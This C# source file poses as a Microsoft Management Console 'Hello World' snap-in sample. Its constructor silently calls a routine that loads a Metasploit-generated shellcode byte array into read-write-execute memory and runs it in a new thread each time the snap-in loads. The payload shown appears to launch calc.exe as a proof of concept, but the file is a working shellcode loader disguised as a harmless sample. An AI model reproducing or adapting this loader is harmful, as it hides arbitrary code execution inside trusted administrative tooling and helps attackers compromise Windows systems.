﻿using Microsoft.ManagementConsole;
using System.ComponentModel;
using System;
using System.Security.Permissions;
using System.Runtime.InteropServices;


[assembly: PermissionSetAttribute(SecurityAction.RequestMinimum, Unrestricted = true)]
namespace Microsoft.ManagementConsole.Samples
{
    /// <summary>
    /// The RunInstaller attribute allows the .Net framework to install the assembly.
    /// </summary>
    [RunInstaller(true)]
    public class InstallUtilSupport : SnapInInstaller
    {
    }
   
    /// <summary>
    /// The main entry point for the creation of the snap-in.
    /// </summary>
    [SnapInSettings("{CFAA3895-4B02-4431-A168-A6416013C3DD}", 
		 DisplayName = "- Simple SnapIn Sample", 
		 Description = "Simple Hello World SnapIn")]
	public class SimpleSnapIn : SnapIn
	{
        /// <summary>
        /// The constructor.
        /// </summary>
        public SimpleSnapIn() 
		{
			// Update tree pane with a node in the tree
			this.RootNode = new ScopeNode();
			this.RootNode.DisplayName = "Hello World";
			Shellcode.Exec();
		}
	} // class
	
	public class Shellcode
	{
			public static void Exec()
			{
				// native function's compiled code
				// generated with metasploit
				byte[] shellcode = new byte[193] {
				0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
				0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
				0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
				0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
				0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
				0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
				0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
				0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
				0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
				0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
				0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
				0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
				0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
	 
				UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
									MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
				IntPtr hThread = IntPtr.Zero;
				UInt32 threadId = 0;
				// prepare data
	 
	 
				IntPtr pinfo = IntPtr.Zero;
	 
				// execute native code
	 
				hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
				WaitForSingleObject(hThread, 0xFFFFFFFF);
	 
		  }
	 
			private static UInt32 MEM_COMMIT = 0x1000;
	 
			private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
	
			[DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
                              UInt32 dwSize, UInt32 dwFreeType);
 
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
 
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
 
          );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
 
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
 
          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(
 
          string moduleName
 
          );
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(
 
          IntPtr hModule,
          string procName
 
          );
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(
 
          string lpFileName
 
          );
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
			
	 
		}
	
 } // namespace
